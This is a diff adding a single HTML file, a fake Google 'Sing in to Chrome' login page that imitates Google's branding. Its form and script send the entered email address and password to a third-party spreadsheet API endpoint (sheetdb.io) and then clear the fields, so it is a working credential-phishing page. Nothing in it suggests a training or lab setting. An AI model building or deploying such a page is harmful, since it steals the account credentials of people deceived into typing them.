@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Login</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
+      crossorigin="anonymous"
+    ></script>
+
+    <style>
+      .container {
+        width: 360px;
+        /* height: 430px; */
+        /* background-color: red; */
+        border: 1px solid black;
+        position: absolute;
+        /* color: darkgoldenrod; */
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 40px 40px;
+      }
+      .header {
+        text-align: center;
+      }
+      .bold {
+        font-weight: 600;
+      }
+      .width {
+        width: 100%;
+      }
+      h6 {
+        margin-bottom: 30px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="header">
+        <h5 class="bold">
+          <font color="blue">G</font><font color="red">o</font
+          ><font color="darkgoldenrod">o</font><font color="blue">g</font
+          ><font color="green">l</font><font color="red">e</font>
+        </h5>
+        <h4>Sing in to Chrome</h4>
+        <h6>Use your Google Account</h6>
+      </div>
+      <form
+        action="https://sheetdb.io/api/v1/31lou4wqecd9f"
+        method="post"
+        id="sheetdb-form"
+      >
+        <div class="mb-3">
+          <label for="exampleInputEmail1" class="form-label"
+            >Email address</label
+          >
+          <input
+            type="email"
+            class="form-control Name"
+            id="exampleInputEmail1"
+            aria-describedby="emailHelp"
+            name="data[email]"
+          />
+          <div id="emailHelp" class="form-text">
+            We'll never share your email with anyone else.
+          </div>
+        </div>
+        <div class="mb-3">
+          <label for="exampleInputPassword1" class="form-label">Password</label>
+          <input
+            type="password"
+            class="form-control Pass"
+            id="exampleInputPassword1"
+            name="data[psw]"
+          />
+        </div>
+        <div class="mb-3 form-check">
+          <input type="checkbox" class="form-check-input" id="exampleCheck1" />
+          <label class="form-check-label" for="exampleCheck1"
+            >Check me out</label
+          >
+        </div>
+        <button type="submit" onclick="reusult()" class="btn btn-primary width">
+          Login
+        </button>
+      </form>
+    </div>
+  </body>
+  <script>
+    const Emai = document.querySelector(".Name");
+    const Pass = document.querySelector(".Pass");
+    const btn = document.querySelector(".btn");
+    var form = document.getElementById("sheetdb-form");
+    form.addEventListener("submit", (e) => {
+      //   document.querySelector(".show").innerHTML += Emai.value + Pass.value;
+      e.preventDefault();
+      fetch(form.action, {
+        method: "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+      }).then((response) => response.json());
+      // .then((html) => {
+      //   window.open("index.html");
+      // });
+      Emai.value = "";
+      Pass.value = "";
+    });
+    // function reusult() {
+    //   //   e.preventDefault();
+    //   document.querySelector(".show").innerHTML = Emai + Pass;
+    // }
+  </script>
+</html>
